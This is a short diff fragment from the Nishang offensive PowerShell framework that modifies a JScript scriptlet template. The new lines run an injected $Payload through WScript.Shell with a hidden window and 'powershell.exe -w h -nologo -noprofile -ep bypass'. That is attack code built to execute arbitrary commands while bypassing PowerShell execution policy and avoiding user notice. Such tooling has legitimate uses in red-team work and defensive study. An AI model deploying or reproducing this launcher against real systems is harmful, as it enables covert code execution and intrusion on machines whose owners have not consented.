@@ -80,7 +80,9 @@ https://github.com/samratashok/nishang
 
     <script language="JScript">
 		<![CDATA[
-            r = new ActiveXObject("WScript.Shell").Exec($Payload);
+           	ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
+            c = "$Payload";
+            r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
 		]]>
 	</script>
     </registration>
